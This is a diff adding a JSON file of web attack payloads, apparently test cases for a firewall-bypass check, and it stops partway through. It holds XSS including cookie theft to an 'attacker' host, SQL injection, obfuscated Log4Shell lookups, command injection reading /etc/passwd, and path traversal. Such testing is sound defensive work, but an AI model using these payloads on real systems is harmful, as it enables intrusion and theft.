@@ -1,0 +1,980 @@
+{
+  "XSS": [
+    {
+      "URL": "%3Csvg%2Fonload%3Dalert%28%RND%%29%2F%2F",
+      "ARGS": "%3Csvg%2Fonload%3Dalert%28%RND%%29%2F%2F",
+      "BODY": "%3Csvg%2Fonload%3Dalert%28%RND%%29%2F%2F",
+      "COOKIE": "%3Csvg%2Fonload%3Dalert%28%RND%%29%2F%2F",
+      "USER-AGENT": "%3Csvg%2Fonload%3Dalert%28%RND%%29%2F%2F",
+      "REFERER": "%3Csvg%2Fonload%3Dalert%28%RND%%29%2F%2F",
+      "HEADER": "%3Csvg%2Fonload%3Dalert%28%RND%%29%2F%2F",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "<form onreset='let test=document;location=\"http://attacker?cookie=\".concat(test.cookie)'><input><input type='reset'>&password1=1&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+      "ARGS": "login%RND%=<form onreset='let test=document;location=\"http://attacker?cookie=\".concat(test.cookie)'><input><input type='reset'>&password1=1&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+      "BODY": "login%RND%=<form onreset='let test=document;location=\"http://attacker?cookie=\".concat(test.cookie)'><input><input type='reset'>&password1=1&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+      "COOKIE": "<form onreset='let test=document;location=\"http://attacker?cookie=\".concat(test.cookie)'><input><input type='reset'>&password1=1&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+      "REFERER": "<form onreset='let test=document;location=\"http://attacker?cookie=\".concat(test.cookie)'><input><input type='reset'>&password1=1&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+      "ENCODE": "Base64 UTF-16 HTML-ENTITY",
+      "BLOCKED": true
+    },
+    {
+      "URL": "al%5Cu0065rt%281%29",
+      "ARGS": "al%5Cu0065rt%281%29",
+      "BODY": "al%5Cu0065rt%281%29",
+      "COOKIE": "al%5Cu0065rt%281%29",
+      "REFERER": "al%5Cu0065rt%281%29",
+      "HEADER": "al%5Cu0065rt%281%29",
+      "ENCODE": "Base64",
+      "BLOCKED": true
+    },
+    {
+      "URL": "top['al\\145rt'](1)",
+      "ARGS": "top['al\\145rt'](1)",
+      "BODY": "top['al\\145rt'](1)",
+      "COOKIE": "top['al\\145rt'](1)",
+      "USER-AGENT": "top['al\\145rt'](1)",
+      "REFERER": "top['al\\145rt'](1)",
+      "HEADER": "top['al\\145rt'](1)",
+      "ENCODE": "Base64",
+      "BLOCKED": true
+    },
+    {
+      "URL": "top[8680439..toString(30)](1)",
+      "ARGS": "top[8680439..toString(30)](1)",
+      "BODY": "top[8680439..toString(30)](1)",
+      "COOKIE": "top[8680439..toString(30)](1)",
+      "USER-AGENT": "top[8680439..toString(30)](1)",
+      "REFERER": "top[8680439..toString(30)](1)",
+      "HEADER": "top[8680439..toString(30)](1)",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "<svg/onload=innerHTML=location.hash> #<img/src/onerror=alert(1)>",
+      "ARGS": "<svg/onload=innerHTML=location.hash> #<img/src/onerror=alert(1)>",
+      "BODY": "<svg/onload=innerHTML=location.hash> #<img/src/onerror=alert(1)>",
+      "COOKIE": "<svg/onload=innerHTML=location.hash> #<img/src/onerror=alert(1)>",
+      "USER-AGENT": "<svg/onload=innerHTML=location.hash> #<img/src/onerror=alert(1)>",
+      "REFERER": "<svg/onload=innerHTML=location.hash> #<img/src/onerror=alert(1)>",
+      "HEADER": "<svg/onload=innerHTML=location.hash> #<img/src/onerror=alert(1)>",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "eval(url.slice(-8)) #alert(1)",
+      "ARGS": "eval(url.slice(-8)) #alert(1)",
+      "BODY": "eval(url.slice(-8)) #alert(1)",
+      "COOKIE": "eval(url.slice(-8)) #alert(1)",
+      "USER-AGENT": "eval(url.slice(-8)) #alert(1)",
+      "REFERER": "eval(url.slice(-8)) #alert(1)",
+      "HEADER": "eval(url.slice(-8)) #alert(1)",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "eval(location.hash.slice(1)) #alert(1)",
+      "ARGS": "eval(location.hash.slice(1)) #alert(1)",
+      "BODY": "eval(location.hash.slice(1)) #alert(1)",
+      "COOKIE": "eval(location.hash.slice(1)) #alert(1)",
+      "USER-AGENT": "eval(location.hash.slice(1)) #alert(1)",
+      "REFERER": "eval(location.hash.slice(1)) #alert(1)",
+      "HEADER": "eval(location.hash.slice(1)) #alert(1)",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    }
+  ],
+  "SQLi": [
+    {
+      "URL": "%27%20or%20%2F%2A%21u%256eion%2A%2F%20%2F%2A%21se%256cect%2A%2F%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%20%27--",
+      "ARGS": "param%RND%=%27%20or%20%2F%2A%21u%256eion%2A%2F%20%2F%2A%21se%256cect%2A%2F%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%20%27--",
+      "BODY": "param%RND%=%27%20or%20%2F%2A%21u%256eion%2A%2F%20%2F%2A%21se%256cect%2A%2F%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%20%27--",
+      "COOKIE": "%27%20or%20%2F%2A%21u%256eion%2A%2F%20%2F%2A%21se%256cect%2A%2F%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%20%27--",
+      "USER-AGENT": "%27%20or%20%2F%2A%21u%256eion%2A%2F%20%2F%2A%21se%256cect%2A%2F%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%20%27--",
+      "REFERER": "%27%20or%20%2F%2A%21u%256eion%2A%2F%20%2F%2A%21se%256cect%2A%2F%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%20%27--",
+      "HEADER": "%27%20or%20%2F%2A%21u%256eion%2A%2F%20%2F%2A%21se%256cect%2A%2F%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%20%27--",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "%27%20un%e2%80%8bion se%e2%80%8blect 1%e2%80%8b,2%e2%80%8b,3%e2%80%8b,4%e2%80%8b,5%e2%80%8b,6%e2%80%8b,7%e2%80%8b,8%e2%80%8b,9%e2%80%8b,0%e2%80%8b,11",
+      "ARGS": "param%RND%=%27%20un%e2%80%8bion se%e2%80%8blect 1%e2%80%8b,2%e2%80%8b,3%e2%80%8b,4%e2%80%8b,5%e2%80%8b,6%e2%80%8b,7%e2%80%8b,8%e2%80%8b,9%e2%80%8b,0%e2%80%8b,112",
+      "BODY": "param%RND%=%27%20un%e2%80%8bion se%e2%80%8blect 1%e2%80%8b,2%e2%80%8b,3%e2%80%8b,4%e2%80%8b,5%e2%80%8b,6%e2%80%8b,7%e2%80%8b,8%e2%80%8b,9%e2%80%8b,0%e2%80%8b,11",
+      "HEADER": "%27%20un%e2%80%8bion se%e2%80%8blect 1%e2%80%8b,2%e2%80%8b,3%e2%80%8b,4%e2%80%8b,5%e2%80%8b,6%e2%80%8b,7%e2%80%8b,8%e2%80%8b,9%e2%80%8b,0%e2%80%8b,11",
+      "USER-AGENT": "%27%20un%e2%80%8bion se%e2%80%8blect 1%e2%80%8b,2%e2%80%8b,3%e2%80%8b,4%e2%80%8b,5%e2%80%8b,6%e2%80%8b,7%e2%80%8b,8%e2%80%8b,9%e2%80%8b,0%e2%80%8b,11",
+      "REFERER": "%27%20un%e2%80%8bion se%e2%80%8blect 1%e2%80%8b,2%e2%80%8b,3%e2%80%8b,4%e2%80%8b,5%e2%80%8b,6%e2%80%8b,7%e2%80%8b,8%e2%80%8b,9%e2%80%8b,0%e2%80%8b,11",
+      "COOKIE": "%27%20un%e2%80%8bion se%e2%80%8blect 1%e2%80%8b,2%e2%80%8b,3%e2%80%8b,4%e2%80%8b,5%e2%80%8b,6%e2%80%8b,7%e2%80%8b,8%e2%80%8b,9%e2%80%8b,0%e2%80%8b,11",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "1%27/**/%256fR/**/50%2521%253D22%253B%2523",
+      "ARGS": "1%27/**/%256fR/**/50%2521%253D22%253B%25232",
+      "BODY": "1%27/**/%256fR/**/50%2521%253D22%253B%2523",
+      "HEADER": "1%27/**/%256fR/**/50%2521%253D22%253B%2523",
+      "USER-AGENT": "1%27/**/%256fR/**/50%2521%253D22%253B%2523",
+      "REFERER": "1%27/**/%256fR/**/50%2521%253D22%253B%2523",
+      "COOKIE": "1%27/**/%256fR/**/50%2521%253D22%253B%2523",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "%220%5C%22XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%289%29%2C0%29%29XOR%5C%22Z",
+      "ARGS": "%220%5C%22XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%289%29%2C0%29%29XOR%5C%22Z",
+      "BODY": "%220%5C%22XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%289%29%2C0%29%29XOR%5C%22Z",
+      "HEADER": "%220%5C%22XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%289%29%2C0%29%29XOR%5C%22Z",
+      "USER-AGENT": "%220%5C%22XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%289%29%2C0%29%29XOR%5C%22Z",
+      "REFERER": "%220%5C%22XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%289%29%2C0%29%29XOR%5C%22Z",
+      "COOKIE": "%220%5C%22XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%289%29%2C0%29%29XOR%5C%22Z",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "query=login&username=rrr';SELECT PG_SLEEP(5)--&password=rr&submit=Login",
+      "ARGS": "query=login&username=rrr';SELECT PG_SLEEP(5)--&password=rr&submit=Login2",
+      "BODY": "query=login&username=rrr';SELECT PG_SLEEP(5)--&password=rr&submit=Login",
+      "HEADER": "query=login&username=rrr';SELECT PG_SLEEP(5)--&password=rr&submit=Login",
+      "USER-AGENT": "query=login&username=rrr';SELECT PG_SLEEP(5)--&password=rr&submit=Login",
+      "REFERER": "query=login&username=rrr';SELECT PG_SLEEP(5)--&password=rr&submit=Login",
+      "COOKIE": "query=login&username=rrr';SELECT PG_SLEEP(5)--&password=rr&submit=Login",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "%27%20AND%20%28SELECT%208871%20FROM%20%28SELECT%28SLEEP%285%29%29%29uZxz%29--%20x",
+      "ARGS": "%27%20AND%20%28SELECT%208871%20FROM%20%28SELECT%28SLEEP%285%29%29%29uZxz%29--%20x",
+      "BODY": "%27%20AND%20%28SELECT%208871%20FROM%20%28SELECT%28SLEEP%285%29%29%29uZxz%29--%20x",
+      "HEADER": "%27%20AND%20%28SELECT%208871%20FROM%20%28SELECT%28SLEEP%285%29%29%29uZxz%29--%20x",
+      "USER-AGENT": "%27%20AND%20%28SELECT%208871%20FROM%20%28SELECT%28SLEEP%285%29%29%29uZxz%29--%20x",
+      "REFERER": "%27%20AND%20%28SELECT%208871%20FROM%20%28SELECT%28SLEEP%285%29%29%29uZxz%29--%20x",
+      "COOKIE": "%27%20AND%20%28SELECT%208871%20FROM%20%28SELECT%28SLEEP%285%29%29%29uZxz%29--%20x",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "(SELECT*FROM(SELECT(SLEEP(10)))a)",
+      "ARGS": "(SELECT*FROM(SELECT(SLEEP(10)))a)2",
+      "BODY": "(SELECT*FROM(SELECT(SLEEP(10)))a)",
+      "HEADER": "(SELECT*FROM(SELECT(SLEEP(10)))a)",
+      "COOKIE": "(SELECT*FROM(SELECT(SLEEP(10)))a)",
+      "USER-AGENT": "(SELECT*FROM(SELECT(SLEEP(10)))a)",
+      "REFERER": "(SELECT*FROM(SELECT(SLEEP(10)))a)",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "%2528select%2520extractvalue%2528xmltype%2528%2527%253C%253Fxml%2520version%253D%25221.0%2522%2520encoding%253D%2522UTF-8%2522%253F%253E%253C%2521DOCTYPE%2520root%2520%255B%2520%253C%2521ENTITY%2520%2525%2520vapot%2520SYSTEM%2520%2522%2527%257C%257C%2528select%2520version%2520from%2520v%2524instance%2529%257C%257C%2527Burp%252F%2522%253E%2525vapot%253B%255D%253E%2527%2529%252C%2527%252Fl%2527%2529%2520from%2520dual%2529",
+      "BODY": "%2528select%2520extractvalue%2528xmltype%2528%2527%253C%253Fxml%2520version%253D%25221.0%2522%2520encoding%253D%2522UTF-8%2522%253F%253E%253C%2521DOCTYPE%2520root%2520%255B%2520%253C%2521ENTITY%2520%2525%2520vapot%2520SYSTEM%2520%2522%2527%257C%257C%2528select%2520version%2520from%2520v%2524instance%2529%257C%257C%2527Burp%252F%2522%253E%2525vapot%253B%255D%253E%2527%2529%252C%2527%252Fl%2527%2529%2520from%2520dual%2529",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    }
+  ],
+  "RCE": [
+    {
+      "URL": "%3B%20cat%20%2Fet%3F%2Fpa%3Fswd",
+      "ARGS": "param%RND%=%3B%20cat%20%2Fet%3F%2Fpa%3Fswd",
+      "BODY": "param%RND%=%3B%20cat%20%2Fet%3F%2Fpa%3Fswd",
+      "COOKIE": "%3B%20cat%20%2Fet%3F%2Fpa%3Fswd",
+      "USER-AGENT": "%3B%20cat%20%2Fet%3F%2Fpa%3Fswd",
+      "REFERER": "%3B%20cat%20%2Fet%3F%2Fpa%3Fswd",
+      "HEADER": "%3B%20cat%20%2Fet%3F%2Fpa%3Fswd",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "${jndi:dns://example.com/}",
+      "BODY": "param%RND%=${jndi:dns://example.com/}",
+      "COOKIE": "${jndi:dns://example.com/}",
+      "USER-AGENT": "${jndi:dns://example.com/}",
+      "REFERER": "${jndi:dns://example.com/}",
+      "HEADER": "${jndi:dns://example.com/}",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "%24%7Bjndi%3Adns%3A%2F%2Fexample.com%2Fa%7D",
+      "ARGS": "%24%7Bjndi%3Adns%3A%2F%2Fexample.com%2Fa%7D",
+      "BODY": "param%RND%=%24%7Bjndi%3Adns%3A%2F%2Fexample.com%2Fa%7D",
+      "COOKIE": "%24%7Bjndi%3Adns%3A%2F%2Fexample.com%2Fa%7D",
+      "USER-AGENT": "%24%7Bjndi%3Adns%3A%2F%2Fexample.com%2Fa%7D",
+      "REFERER": "%24%7Bjndi%3Adns%3A%2F%2Fexample.com%2Fa%7D",
+      "HEADER": "%24%7Bjndi%3Adns%3A%2F%2Fexample.com%2Fa%7D",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "%24%7B%24%7Benv%3AENV_NAME%3A-j%7Dn%24%7Benv%3AENV_NAME%3A-d%7Di%24%7Benv%3AENV_NAME%3A-%3A%7D%24%7Benv%3AENV_NAME%3A-l%7Dd%24%7Benv%3AENV_NAME%3A-a%7Dp%24%7Benv%3AENV_NAME%3A-%3A%7D%2F%2Fexample.com%2F",
+      "ARGS": "%24%7B%24%7Benv%3AENV_NAME%3A-j%7Dn%24%7Benv%3AENV_NAME%3A-d%7Di%24%7Benv%3AENV_NAME%3A-%3A%7D%24%7Benv%3AENV_NAME%3A-l%7Dd%24%7Benv%3AENV_NAME%3A-a%7Dp%24%7Benv%3AENV_NAME%3A-%3A%7D%2F%2Fexample.com%2F",
+      "BODY": "param%RND%=%24%7B%24%7Benv%3AENV_NAME%3A-j%7Dn%24%7Benv%3AENV_NAME%3A-d%7Di%24%7Benv%3AENV_NAME%3A-%3A%7D%24%7Benv%3AENV_NAME%3A-l%7Dd%24%7Benv%3AENV_NAME%3A-a%7Dp%24%7Benv%3AENV_NAME%3A-%3A%7D%2F%2Fexample.com%2F",
+      "COOKIE": "%24%7B%24%7Benv%3AENV_NAME%3A-j%7Dn%24%7Benv%3AENV_NAME%3A-d%7Di%24%7Benv%3AENV_NAME%3A-%3A%7D%24%7Benv%3AENV_NAME%3A-l%7Dd%24%7Benv%3AENV_NAME%3A-a%7Dp%24%7Benv%3AENV_NAME%3A-%3A%7D%2F%2Fexample.com%2F",
+      "USER-AGENT": "%24%7B%24%7Benv%3AENV_NAME%3A-j%7Dn%24%7Benv%3AENV_NAME%3A-d%7Di%24%7Benv%3AENV_NAME%3A-%3A%7D%24%7Benv%3AENV_NAME%3A-l%7Dd%24%7Benv%3AENV_NAME%3A-a%7Dp%24%7Benv%3AENV_NAME%3A-%3A%7D%2F%2Fexample.com%2F",
+      "REFERER": "%24%7B%24%7Benv%3AENV_NAME%3A-j%7Dn%24%7Benv%3AENV_NAME%3A-d%7Di%24%7Benv%3AENV_NAME%3A-%3A%7D%24%7Benv%3AENV_NAME%3A-l%7Dd%24%7Benv%3AENV_NAME%3A-a%7Dp%24%7Benv%3AENV_NAME%3A-%3A%7D%2F%2Fexample.com%2F",
+      "HEADER": "%24%7B%24%7Benv%3AENV_NAME%3A-j%7Dn%24%7Benv%3AENV_NAME%3A-d%7Di%24%7Benv%3AENV_NAME%3A-%3A%7D%24%7Benv%3AENV_NAME%3A-l%7Dd%24%7Benv%3AENV_NAME%3A-a%7Dp%24%7Benv%3AENV_NAME%3A-%3A%7D%2F%2Fexample.com%2F",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "%24%7Bjndi%3A%24%7Blower%3Al%7D%24%7Blower%3Ad%7Da%24%7Blower%3Ap%7D%3A%2F%2Fex%24%7Bupper%3Aa%7Dmple.com",
+      "ARGS": "%24%7Bjndi%3A%24%7Blower%3Al%7D%24%7Blower%3Ad%7Da%24%7Blower%3Ap%7D%3A%2F%2Fex%24%7Bupper%3Aa%7Dmple.com",
+      "BODY": "param%RND%=%24%7Bjndi%3A%24%7Blower%3Al%7D%24%7Blower%3Ad%7Da%24%7Blower%3Ap%7D%3A%2F%2Fex%24%7Bupper%3Aa%7Dmple.com",
+      "COOKIE": "%24%7Bjndi%3A%24%7Blower%3Al%7D%24%7Blower%3Ad%7Da%24%7Blower%3Ap%7D%3A%2F%2Fex%24%7Bupper%3Aa%7Dmple.com",
+      "USER-AGENT": "%24%7Bjndi%3A%24%7Blower%3Al%7D%24%7Blower%3Ad%7Da%24%7Blower%3Ap%7D%3A%2F%2Fex%24%7Bupper%3Aa%7Dmple.com",
+      "REFERER": "%24%7Bjndi%3A%24%7Blower%3Al%7D%24%7Blower%3Ad%7Da%24%7Blower%3Ap%7D%3A%2F%2Fex%24%7Bupper%3Aa%7Dmple.com",
+      "HEADER": "%24%7Bjndi%3A%24%7Blower%3Al%7D%24%7Blower%3Ad%7Da%24%7Blower%3Ap%7D%3A%2F%2Fex%24%7Bupper%3Aa%7Dmple.com",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "%24%7B%24%7B%3A%3A-j%7D%24%7B%3A%3A-n%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-i%7D%24%7B%3A%3A-r%7D%24%7B%3A%3A-m%7D%24%7B%3A%3A-i%7D%3A%2F%2Fexample.com",
+      "ARGS": "%24%7B%24%7B%3A%3A-j%7D%24%7B%3A%3A-n%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-i%7D%24%7B%3A%3A-r%7D%24%7B%3A%3A-m%7D%24%7B%3A%3A-i%7D%3A%2F%2Fexample.com",
+      "BODY": "param%RND%=%24%7B%24%7B%3A%3A-j%7D%24%7B%3A%3A-n%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-i%7D%24%7B%3A%3A-r%7D%24%7B%3A%3A-m%7D%24%7B%3A%3A-i%7D%3A%2F%2Fexample.com",
+      "COOKIE": "%24%7B%24%7B%3A%3A-j%7D%24%7B%3A%3A-n%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-i%7D%24%7B%3A%3A-r%7D%24%7B%3A%3A-m%7D%24%7B%3A%3A-i%7D%3A%2F%2Fexample.com",
+      "USER-AGENT": "%24%7B%24%7B%3A%3A-j%7D%24%7B%3A%3A-n%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-i%7D%24%7B%3A%3A-r%7D%24%7B%3A%3A-m%7D%24%7B%3A%3A-i%7D%3A%2F%2Fexample.com",
+      "REFERER": "%24%7B%24%7B%3A%3A-j%7D%24%7B%3A%3A-n%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-i%7D%24%7B%3A%3A-r%7D%24%7B%3A%3A-m%7D%24%7B%3A%3A-i%7D%3A%2F%2Fexample.com",
+      "HEADER": "%24%7B%24%7B%3A%3A-j%7D%24%7B%3A%3A-n%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-i%7D%24%7B%3A%3A-r%7D%24%7B%3A%3A-m%7D%24%7B%3A%3A-i%7D%3A%2F%2Fexample.com",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "%24%5C%7B%24%5C%7B%3A%3A-j%5C%7D%24%5C%7B%3A%3A-n%5C%7D%24%5C%7B%3A%3A-d%5C%7D%24%5C%7B%3A%3A-i%5C%7D%3A%24%5C%7B%3A%3A-r%5C%7D%24%5C%7B%3A%3A-m%5C%7D%24%5C%7B%3A%3A-i%5C%7D%3A%2F%2F%24%5C%7Benv%3AUSER%5C%7D.example.com",
+      "ARGS": "%24%5C%7B%24%5C%7B%3A%3A-j%5C%7D%24%5C%7B%3A%3A-n%5C%7D%24%5C%7B%3A%3A-d%5C%7D%24%5C%7B%3A%3A-i%5C%7D%3A%24%5C%7B%3A%3A-r%5C%7D%24%5C%7B%3A%3A-m%5C%7D%24%5C%7B%3A%3A-i%5C%7D%3A%2F%2F%24%5C%7Benv%3AUSER%5C%7D.example.com",
+      "BODY": "param%RND%=%24%5C%7B%24%5C%7B%3A%3A-j%5C%7D%24%5C%7B%3A%3A-n%5C%7D%24%5C%7B%3A%3A-d%5C%7D%24%5C%7B%3A%3A-i%5C%7D%3A%24%5C%7B%3A%3A-r%5C%7D%24%5C%7B%3A%3A-m%5C%7D%24%5C%7B%3A%3A-i%5C%7D%3A%2F%2F%24%5C%7Benv%3AUSER%5C%7D.example.com",
+      "COOKIE": "%24%5C%7B%24%5C%7B%3A%3A-j%5C%7D%24%5C%7B%3A%3A-n%5C%7D%24%5C%7B%3A%3A-d%5C%7D%24%5C%7B%3A%3A-i%5C%7D%3A%24%5C%7B%3A%3A-r%5C%7D%24%5C%7B%3A%3A-m%5C%7D%24%5C%7B%3A%3A-i%5C%7D%3A%2F%2F%24%5C%7Benv%3AUSER%5C%7D.example.com",
+      "USER-AGENT": "%24%5C%7B%24%5C%7B%3A%3A-j%5C%7D%24%5C%7B%3A%3A-n%5C%7D%24%5C%7B%3A%3A-d%5C%7D%24%5C%7B%3A%3A-i%5C%7D%3A%24%5C%7B%3A%3A-r%5C%7D%24%5C%7B%3A%3A-m%5C%7D%24%5C%7B%3A%3A-i%5C%7D%3A%2F%2F%24%5C%7Benv%3AUSER%5C%7D.example.com",
+      "REFERER": "%24%5C%7B%24%5C%7B%3A%3A-j%5C%7D%24%5C%7B%3A%3A-n%5C%7D%24%5C%7B%3A%3A-d%5C%7D%24%5C%7B%3A%3A-i%5C%7D%3A%24%5C%7B%3A%3A-r%5C%7D%24%5C%7B%3A%3A-m%5C%7D%24%5C%7B%3A%3A-i%5C%7D%3A%2F%2F%24%5C%7Benv%3AUSER%5C%7D.example.com",
+      "HEADER": "%24%5C%7B%24%5C%7B%3A%3A-j%5C%7D%24%5C%7B%3A%3A-n%5C%7D%24%5C%7B%3A%3A-d%5C%7D%24%5C%7B%3A%3A-i%5C%7D%3A%24%5C%7B%3A%3A-r%5C%7D%24%5C%7B%3A%3A-m%5C%7D%24%5C%7B%3A%3A-i%5C%7D%3A%2F%2F%24%5C%7Benv%3AUSER%5C%7D.example.com",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "%3B%20cat%20%2Fet%e2%80%8b%3F%2F%e2%80%8bpa%e2%80%8b%3F%3Fwd",
+      "ARGS": "param%RND%=%3B%20cat%20%2Fet%e2%80%8b%3F%2F%e2%80%8bpa%e2%80%8b%3F%3Fwd",
+      "BODY": "param%RND%=%3B%20cat%20%2Fet%e2%80%8b%3F%2F%e2%80%8bpa%e2%80%8b%3F%3Fwd",
+      "COOKIE": "%3B%20cat%20%2Fet%e2%80%8b%3F%2F%e2%80%8bpa%e2%80%8b%3F%3Fwd",
+      "USER-AGENT": "%3B%20cat%20%2Fet%e2%80%8b%3F%2F%e2%80%8bpa%e2%80%8b%3F%3Fwd",
+      "REFERER": "%3B%20cat%20%2Fet%e2%80%8b%3F%2F%e2%80%8bpa%e2%80%8b%3F%3Fwd",
+      "HEADER": "%3B%20cat%20%2Fet%e2%80%8b%3F%2F%e2%80%8bpa%e2%80%8b%3F%3Fwd",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    }
+  ],
+  "LFI": [
+    {
+      "ARGS": "param%RND%=../../../../../../../..//etc/passwd",
+      "BODY": "param%RND%=../../../../../../../..//etc/passwd",
+      "COOKIE": "../../../../../../../..//etc/passwd",
+      "USER-AGENT": "../../../../../../../..//etc/passwd",
+      "REFERER": "../../../../../../../..//etc/passwd",
+      "HEADER": "../../../../../../../..//etc/passwd",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "param%RND%=../../../../../../../../../../../../boot.ini",
+      "BODY": "param%RND%=../../../../../../../../../../../../boot.ini",
+      "COOKIE": "../../../../../../../../../../../../boot.ini",
+      "USER-AGENT": "../../../../../../../../../../../../boot.ini",
+      "REFERER": "../../../../../../../../../../../../boot.ini",
+      "HEADER": "../../../../../../../../../../../../boot.ini",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "ARGS": "param%RND%=../../../../../../../../boot.ini",
+      "BODY": "param%RND%=../../../../../../../../boot.ini",
+      "COOKIE": "../../../../../../../../boot.ini",
+      "USER-AGENT": "../../../../../../../../boot.ini",
+      "REFERER": "../../../../../../../../boot.ini",
+      "HEADER": "../../../../../../../../boot.ini",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini",
+      "ARGS": "param%RND%=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini",
+      "BODY": "param%RND%=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini",
+      "COOKIE": "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini",
+      "USER-AGENT": "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini",
+      "REFERER": "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini",
+      "HEADER": "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "BODY": "param%RND%=I%40kdo9ijegieokf%2Ckinkokdw0=login=admin=_token=ifwkaw-9ri0ofigjo9fgkiwn9df2o0kf0w9tgk30=parm2=fdna9rkif2ndfkigfji89rkfj29rk0hg3j98yhfile=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini=password=fawikfiawgfiawkgiwaigkoiwg",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "BODY": "password%RND%=fawikfiawgfiawkgiwaigkoiwg&abc=C:/WINDOWS/php.ini&param=I@kdo9ijegieokf,kinkokdw0&login=admin&_token=ifwkaw-9ri0ofigjo9fgkiwn9df2o0kf0w9tgk30&parm2=fdna9rkif2ndfkigfji89rkfj29rk0hg3j98yh",
+      "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
+    },
+    {
+      "URL": "/app//////////////////../../../../../../../../etc/passwd",
+      "BLOCKED": true
+    },
+    {
+      "URL": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%2Fetc%2Fpasswd",
+      "ARGS": "param%RND%=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%2Fetc%2Fpasswd",
+      "BODY": "param%RND%=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%2Fetc%2Fpasswd",
